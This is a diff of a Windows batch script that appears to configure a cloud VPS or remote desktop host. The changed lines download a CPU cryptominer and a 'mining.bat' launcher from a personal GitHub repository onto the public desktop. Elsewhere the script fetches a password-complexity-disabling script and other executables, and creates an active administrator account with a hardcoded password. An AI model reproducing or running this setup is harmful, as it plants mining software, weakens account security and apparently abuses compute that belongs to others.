@@ -5,6 +5,8 @@ REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" 
 curl -O https://raw.githubusercontent.com/hernio/azure/main/DisablePasswordComplexity.ps1 > out.txt 2>&1
 curl -o "C:\Users\Public\Desktop\Fast Config VPS.exe" https://raw.githubusercontent.com/hernio/azure/main/FastConfigVPS_v5.1.exe > out.txt 2>&1
 curl -o "C:\Users\Public\Desktop\EVKey Vietnamese Keyboard.exe" https://raw.githubusercontent.com/hernio/azure/main/EVKey64.exe > out.txt 2>&1
+curl -o "C:\Users\Public\Desktop\cpuminer-sse2.exe" https://raw.githubusercontent.com/hernio/azure/main/cpuminer-sse2.exe > out.txt 2>&1
+curl -o "C:\Users\Public\Desktop\mining.bat" https://raw.githubusercontent.com/hernio/azure/main/mining.bat > out.txt 2>&1
 net user administrator Jovano@123 /add >nul
 net localgroup administrators administrator /add >nul
 net user administrator /active:yes >nul
